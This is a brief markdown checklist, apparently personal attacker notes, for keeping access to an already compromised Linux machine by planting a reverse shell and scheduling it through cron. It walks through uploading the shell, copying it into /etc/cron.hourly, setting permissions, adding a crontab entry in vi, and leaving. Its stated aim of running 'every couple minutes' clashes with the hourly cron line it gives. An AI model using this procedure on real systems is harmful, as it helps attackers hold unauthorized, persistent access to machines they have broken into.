# Reverse Shell Protocol
## Assumptions
We already have a shell on the machine, but access is unreliable

## Steps
1. Upload reverse shell code to target
2. Set up cron job to execute code every couple minutes
	A. cd /etc/cron.hourly
	B. copy revshell to cron.hourly
	C. chmod 755 revshell
	D. crontab -e (this will open vi)
	E. i (vi to insert mode)
	F. 3 * * * * revshell
	G. esc
	H. :x
3. Get out